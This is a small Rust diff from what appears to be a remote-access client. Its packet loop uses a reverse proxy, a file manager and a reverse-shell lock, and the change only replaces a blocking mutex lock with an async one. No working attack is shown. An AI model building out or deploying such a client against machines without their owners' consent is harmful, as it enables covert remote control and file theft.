@@ -30,7 +30,7 @@ pub async fn reading_loop(
     let config = get_config();
     let mut reverse_proxy = ReverseProxy::new();
     let mut file_manager = FileManager::new();
-    let mut reverse_shell_lock = REVERSE_SHELL.lock().unwrap();
+    let mut reverse_shell_lock = REVERSE_SHELL.lock().await;
     'l: loop {
         match reader.read_packet(&secret, nonce_generator.as_mut()).await {
             Ok(Some(ClientboundPacket::InitClient)) => {
